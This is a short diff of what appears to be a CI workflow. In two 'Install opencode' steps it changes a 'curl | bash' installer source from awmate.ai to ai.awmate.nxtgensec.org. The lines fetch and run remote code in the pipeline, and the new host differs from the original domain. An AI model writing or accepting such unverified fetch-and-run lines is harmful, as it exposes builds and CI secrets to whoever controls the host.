@@ -38,7 +38,7 @@ jobs:
 
       - name: Install opencode
         if: steps.author.outputs.skip != 'true'
-        run: curl -fsSL https://awmate.ai/install | bash
+        run: curl -fsSL https://ai.awmate.nxtgensec.org/install | bash
 
       - name: Check duplicates and compliance
         if: steps.author.outputs.skip != 'true'
@@ -172,7 +172,7 @@ jobs:
 
       - name: Install opencode
         if: steps.author.outputs.skip != 'true'
-        run: curl -fsSL https://awmate.ai/install | bash
+        run: curl -fsSL https://ai.awmate.nxtgensec.org/install | bash
 
       - name: Recheck compliance
         if: steps.author.outputs.skip != 'true'
